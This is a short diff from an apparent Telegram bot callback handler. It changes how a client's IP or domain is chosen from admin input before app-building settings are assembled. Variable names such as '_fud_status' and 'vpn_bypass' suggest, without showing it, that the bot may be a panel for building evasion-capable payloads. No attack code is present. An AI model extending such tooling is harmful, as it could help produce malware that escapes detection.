@@ -5258,7 +5258,9 @@ def handle_callback(call):
         ).fetchone()
         _db.close()
         _client_name  = (_cl["profile_name"] or _cl["telegram_username"]) if _cl else ""
-        _client_ip    = _cl["rdp_ip"] if _cl else ""
+        # Use sbuf['ip'] as client_ip — this holds exactly what admin entered
+        # (domain OR IP). Never fall back to rdp_ip which is always a raw IP.
+        _client_ip    = sbuf["ip"] if sbuf and sbuf.get("ip") else (_cl["rdp_ip"] if _cl else "")
         _client_token = _cl["token"] if _cl else "manual"
         _fud_status   = str(int(_cl["vpn_bypass"])) if _cl and "vpn_bypass" in _cl.keys() else "1"
         # Determine app_name: custom > template display name
